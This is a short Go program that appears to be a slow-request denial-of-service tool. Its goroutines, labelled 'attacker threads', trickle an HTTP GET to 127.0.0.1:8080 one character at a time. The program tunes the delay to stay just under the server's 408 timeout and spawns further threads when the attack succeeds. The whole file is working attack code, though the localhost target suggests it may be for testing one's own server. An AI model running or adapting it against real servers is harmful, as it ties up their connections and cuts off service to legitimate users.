package main

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"net"
	"strings"
	"time"
)

func main() {
	for i := 0; i < 100; i++  {
		go attack()
		randomSleep(50)
	}
	fmt.Scanln()
	fmt.Println("done")
}

func attack() {
	fmt.Println("NEW ATTACKER THREAD!")
	k:= 20
	score := 0
	for {
		start := time.Now()

		conn, err := net.Dial("tcp", "127.0.0.1:8080")

		if err != nil {
			log.Println(err)
			score++
			continue
		}

		reqStr := "GET /greeting/ HTTP/1.0\r\n\r\n"

		for _, ch := range reqStr {
			fmt.Fprintf(conn, "%c", ch)
			randomSleep(k)
		}

		status, _ := bufio.NewReader(conn).ReadString('\n')
		log.Printf("%s\t%s\n", status, time.Since(start))

		if strings.Contains(status, "200") {
			score--
			k++
		} else if strings.Contains(status, "408") && k > 2 {
			k-=2
			score--
		} else {
			score++
		}

		if score < -10 {
			go attack()
		}

		fmt.Println(score, k)
		conn.Close()
	}
}

func randomSleep(i int) {
	min := i * 5
	max := i * 10

	r := rand.Intn(max - min) + min
	time.Sleep(time.Duration(r) * time.Millisecond)
}
